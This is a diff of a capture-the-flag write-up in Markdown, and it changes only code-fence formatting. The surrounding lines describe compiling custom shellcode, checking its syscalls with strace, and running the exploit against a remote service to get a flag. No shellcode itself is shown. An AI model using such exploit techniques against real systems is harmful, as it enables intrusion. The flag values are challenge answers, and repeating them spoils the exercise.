@@ -469,7 +469,7 @@ shellcode = asm(custom_assembly)
 
 We can check if our shellcode works by putting the shellcode in a file called shellcode.s, compiling it into an ELF file, then using `strace` to the syscalls made.
 
-````ansi [Terminal]
+```ansi [Terminal]
 gcc -nostdlib -static shellcode.s -o shellcode-elf
 strace ./shellcode-elf
 
@@ -481,6 +481,7 @@ write(1, "ctf{flag}\n", 10ctf{flag}
 exit(0)                                 = ?
 +++ exited with 0 +++
 ```
+
 From the fact that the write seems to have written `ctf{flag}` out to the terminal, our shellcode works as intended.
 
 Now, running the exploit in remote:
@@ -490,6 +491,6 @@ Now, running the exploit in remote:
 
 [*] Process './service' stopped with exit code 0 (pid 85879)
 cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}
-````
+```
 
 We've got the flag: `cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}`!
